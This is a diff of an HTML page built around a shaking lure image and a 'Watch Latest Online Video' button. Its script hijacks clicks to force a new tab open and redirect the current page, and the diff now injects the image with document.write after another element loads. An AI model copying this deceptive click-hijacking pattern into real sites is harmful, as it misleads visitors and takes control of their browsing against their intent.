@@ -64,9 +64,8 @@ html, body
 <div class="point">
 <div class="fixed">
 
-  <img src="https://iili.io/mI6RcX.png" alt="Girl in a jacket" class="imageOK" style="animation: shake-animation 2s ease infinite; width: auto; height: auto; position: fixed; top: 47%; left: 0; right: 0; margin: auto;">
+<script> document.querySelector('.imageNO').onload = function(){ document.write('<img src="https://iili.io/mI6RcX.png" alt="Girl in a jacket" class="imageOK" style="animation: shake-animation 2s ease infinite; width: auto; height: auto; position: fixed; top: 47%; left: 0; right: 0; margin: auto;">') }; </script>
 
-  
 <div class='box-main'> <button class='btn'>Watch Latest Online Video</button> </div> <style> .btn { display: inline-block; border-radius: 0px!important; letter-spacing: 0.5px; border: none; border-bottom: 3px solid #808080; background: #097969; color: white; width: 100%; font: bold 25px/1.3em Helvetica, Arial, sans-serif!important; text-align: center; font-weight: bold; font-size: 23px; padding: 6px 8px; cursor: pointer; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } </style>
 
 <script>
@@ -79,10 +78,8 @@ if(navigator.userAgent.match(/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kin
 </div>
 </div>
 </div>
-<script> document.querySelector('.imageNO').onload = function(){
-    alert('iframe loaded');
-}; </script>
-  <script>
+
+<script>
 document.querySelector(".imageOK").onclick = function () {
 document.write('<script> window.onbeforeload = null; <\/script>'); sessionStorage.setItem("click", 500); window.open("https://duckduckgo.com", "_blank"); setTimeout(function assign() { window.location.assign("https://google.com"); }, 0);
 return true;
